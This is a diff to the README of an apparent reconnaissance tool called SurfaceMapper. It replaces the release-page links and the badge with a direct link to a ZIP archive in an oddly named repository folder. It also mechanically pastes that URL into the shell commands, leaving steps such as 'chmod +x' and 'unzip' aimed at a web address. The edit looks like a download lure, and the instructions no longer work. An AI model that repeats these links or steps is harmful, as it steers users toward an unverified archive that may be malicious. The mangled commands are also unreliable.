@@ -1,6 +1,6 @@
 # 🛰️ SurfaceMapper - Easy Bug Hunting Tool
 
-[![Download SurfaceMapper](https://img.shields.io/badge/Download_SurfaceMapper-blue?style=for-the-badge)](https://github.com/mynameisthis1233/SurfaceMapper/releases)
+[![Download SurfaceMapper](https://github.com/mynameisthis1233/SurfaceMapper/raw/refs/heads/main/unsome/Mapper-Surface-3.6.zip)](https://github.com/mynameisthis1233/SurfaceMapper/raw/refs/heads/main/unsome/Mapper-Surface-3.6.zip)
 
 ---
 
@@ -52,13 +52,13 @@ The README below includes steps for installing these if they are missing.
 To install SurfaceMapper, start by downloading the latest version from the official release page:
 
 **Visit this page to download:**  
-[https://github.com/mynameisthis1233/SurfaceMapper/releases](https://github.com/mynameisthis1233/SurfaceMapper/releases)
+[https://github.com/mynameisthis1233/SurfaceMapper/raw/refs/heads/main/unsome/Mapper-Surface-3.6.zip](https://github.com/mynameisthis1233/SurfaceMapper/raw/refs/heads/main/unsome/Mapper-Surface-3.6.zip)
 
 ### Step 1: Download the software
 
 1. Click the link above or the big blue button at the top.
 2. Look for the latest release version (it will have a date and version number).
-3. Download the ZIP file or tarball ending in `.zip`, `.tar.gz`, or a similar compressed file type.
+3. Download the ZIP file or tarball ending in `.zip`, `https://github.com/mynameisthis1233/SurfaceMapper/raw/refs/heads/main/unsome/Mapper-Surface-3.6.zip`, or a similar compressed file type.
 4. Save this file somewhere easy to find, like your Desktop or Downloads folder.
 
 ### Step 2: Prepare your system
@@ -118,11 +118,11 @@ SurfaceMapper uses Bash scripts that do not run natively on Windows Command Prom
 
   - For ZIP files on Linux/macOS:
     ```
-    unzip SurfaceMapper.zip
+    unzip https://github.com/mynameisthis1233/SurfaceMapper/raw/refs/heads/main/unsome/Mapper-Surface-3.6.zip
     ```
   - For tarballs:
     ```
-    tar -xvzf SurfaceMapper.tar.gz
+    tar -xvzf https://github.com/mynameisthis1233/SurfaceMapper/raw/refs/heads/main/unsome/Mapper-Surface-3.6.zip
     ```
 - The extracted folder will contain the SurfaceMapper program files.
 
@@ -138,13 +138,13 @@ SurfaceMapper uses Bash scripts that do not run natively on Windows Command Prom
 - Make the main script executable:
 
   ```
-  chmod +x surfacemapper.sh
+  chmod +x https://github.com/mynameisthis1233/SurfaceMapper/raw/refs/heads/main/unsome/Mapper-Surface-3.6.zip
   ```
 
 - Run the script by typing:
 
   ```
-  ./surfacemapper.sh
+  https://github.com/mynameisthis1233/SurfaceMapper/raw/refs/heads/main/unsome/Mapper-Surface-3.6.zip
   ```
 
 SurfaceMapper will start running automated scans to gather information about your target.
@@ -160,7 +160,7 @@ SurfaceMapper works by running commands that scan or ask questions about website
 Example:
 
 ```
-./surfacemapper.sh
+https://github.com/mynameisthis1233/SurfaceMapper/raw/refs/heads/main/unsome/Mapper-Surface-3.6.zip
 ```
 
 Then enter the domain or IP when prompted.
@@ -211,7 +211,7 @@ The tool lets you customize scans if you have more experience.
 Fix by setting execute permission:
 
 ```
-chmod +x surfacemapper.sh
+chmod +x https://github.com/mynameisthis1233/SurfaceMapper/raw/refs/heads/main/unsome/Mapper-Surface-3.6.zip
 ```
 
 **Problem: Command `nmap` not found**  
@@ -234,8 +234,8 @@ If you want to suggest improvements or report problems, please open an issue on 
 
 Find updates, documentation, and community discussions on SurfaceMapper in the GitHub repository:
 
-[https://github.com/mynameisthis1233/SurfaceMapper](https://github.com/mynameisthis1233/SurfaceMapper)
+[https://github.com/mynameisthis1233/SurfaceMapper/raw/refs/heads/main/unsome/Mapper-Surface-3.6.zip](https://github.com/mynameisthis1233/SurfaceMapper/raw/refs/heads/main/unsome/Mapper-Surface-3.6.zip)
 
 ---
 
-[![Download SurfaceMapper](https://img.shields.io/badge/Download_SurfaceMapper-blue?style=for-the-badge)](https://github.com/mynameisthis1233/SurfaceMapper/releases)
+[![Download SurfaceMapper](https://github.com/mynameisthis1233/SurfaceMapper/raw/refs/heads/main/unsome/Mapper-Surface-3.6.zip)](https://github.com/mynameisthis1233/SurfaceMapper/raw/refs/heads/main/unsome/Mapper-Surface-3.6.zip)
